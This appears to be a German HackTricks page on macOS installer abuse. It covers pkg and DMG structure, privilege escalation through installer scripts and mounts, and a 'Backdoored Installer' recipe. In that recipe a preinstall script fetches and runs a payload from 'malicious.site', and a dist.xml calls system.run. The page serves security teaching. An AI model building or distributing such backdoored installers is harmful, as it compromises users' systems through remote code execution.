# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Grundinformationen

Ein macOS **Installationspaket** (auch bekannt als `.pkg`-Datei) ist ein Dateiformat, das von macOS verwendet wird, um **Software zu verteilen**. Diese Dateien sind wie eine **Box, die alles enthält, was ein Stück Software** benötigt, um korrekt installiert und ausgeführt zu werden.

Die Paketdatei selbst ist ein Archiv, das eine **Hierarchie von Dateien und Verzeichnissen enthält, die auf dem Zielcomputer installiert werden**. Es kann auch **Skripte** enthalten, um Aufgaben vor und nach der Installation auszuführen, wie das Einrichten von Konfigurationsdateien oder das Bereinigen alter Versionen der Software.

### Hierarchie

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Anpassungen (Titel, Willkommensnachricht…) und Skript-/Installationsprüfungen
- **PackageInfo (xml)**: Informationen, Installationsanforderungen, Installationsort, Pfade zu auszuführenden Skripten
- **Bill of materials (bom)**: Liste der zu installierenden, zu aktualisierenden oder zu entfernenden Dateien mit Dateiberechtigungen
- **Payload (CPIO-Archiv gzip-komprimiert)**: Dateien, die im `install-location` aus PackageInfo installiert werden
- **Scripts (CPIO-Archiv gzip-komprimiert)**: Vor- und Nachinstallationsskripte und weitere Ressourcen, die in ein temporäres Verzeichnis zur Ausführung extrahiert werden.

### Dekomprimieren
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Um den Inhalt des Installers zu visualisieren, ohne ihn manuell zu dekomprimieren, können Sie auch das kostenlose Tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) verwenden.

## DMG Grundinformationen

DMG-Dateien oder Apple Disk Images sind ein Dateiformat, das von Apples macOS für Disk-Images verwendet wird. Eine DMG-Datei ist im Wesentlichen ein **einhängbares Disk-Image** (es enthält sein eigenes Dateisystem), das rohe Blockdaten enthält, die typischerweise komprimiert und manchmal verschlüsselt sind. Wenn Sie eine DMG-Datei öffnen, **hängt macOS sie ein, als ob es sich um ein physisches Laufwerk handelt**, sodass Sie auf ihren Inhalt zugreifen können.

> [!CAUTION]
> Beachten Sie, dass **`.dmg`**-Installer **so viele Formate** unterstützen, dass in der Vergangenheit einige von ihnen, die Schwachstellen enthielten, missbraucht wurden, um **Kernel-Codeausführung** zu erhalten.

### Hierarchie

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die Hierarchie einer DMG-Datei kann je nach Inhalt unterschiedlich sein. Für Anwendungs-DMGs folgt sie jedoch normalerweise dieser Struktur:

- Top Level: Dies ist die Wurzel des Disk-Images. Es enthält oft die Anwendung und möglicherweise einen Link zum Anwendungsordner.
- Anwendung (.app): Dies ist die eigentliche Anwendung. In macOS ist eine Anwendung typischerweise ein Paket, das viele einzelne Dateien und Ordner enthält, die die Anwendung ausmachen.
- Anwendungen-Link: Dies ist eine Verknüpfung zum Anwendungsordner in macOS. Der Zweck davon ist es, Ihnen die Installation der Anwendung zu erleichtern. Sie können die .app-Datei auf diese Verknüpfung ziehen, um die App zu installieren.

## Privesc über pkg-Missbrauch

### Ausführung aus öffentlichen Verzeichnissen

Wenn ein Pre- oder Post-Installationsskript beispielsweise von **`/var/tmp/Installerutil`** ausgeführt wird und ein Angreifer dieses Skript kontrollieren könnte, könnte er die Privilegien erhöhen, wann immer es ausgeführt wird. Oder ein weiteres ähnliches Beispiel:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dies ist eine [öffentliche Funktion](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), die mehrere Installer und Updater aufrufen, um **etwas als root auszuführen**. Diese Funktion akzeptiert den **Pfad** der **Datei**, die **ausgeführt** werden soll, als Parameter. Wenn ein Angreifer jedoch diese Datei **modifizieren** könnte, wäre er in der Lage, ihre Ausführung mit Root zu **missbrauchen**, um die **Privilegien zu erhöhen**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Für weitere Informationen siehe diesen Vortrag: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Ausführung durch Einhängen

Wenn ein Installer in `/tmp/fixedname/bla/bla` schreibt, ist es möglich, ein **Mount** über `/tmp/fixedname` ohne Besitzer zu **erstellen**, sodass du **jede Datei während der Installation ändern** kannst, um den Installationsprozess auszunutzen.

Ein Beispiel dafür ist **CVE-2021-26089**, das es geschafft hat, ein **periodisches Skript zu überschreiben**, um als Root auszuführen. Für weitere Informationen siehe den Vortrag: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg als Malware

### Leerer Payload

Es ist möglich, einfach eine **`.pkg`**-Datei mit **Pre- und Post-Install-Skripten** zu generieren, ohne einen echten Payload außer der Malware in den Skripten.

### JS in der Verteilungs-XML

Es ist möglich, **`<script>`**-Tags in der **Verteilungs-XML**-Datei des Pakets hinzuzufügen, und dieser Code wird ausgeführt und kann **Befehle ausführen** mit **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

Bösartiger Installer, der ein Skript und JS-Code in dist.xml verwendet.
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Referenzen

- [**DEF CON 27 - Unpacking Pkgs Ein Blick in macOS Installer-Pakete und häufige Sicherheitsanfälligkeiten**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "Die wilde Welt der macOS Installer" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs Ein Blick in macOS Installer-Pakete**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
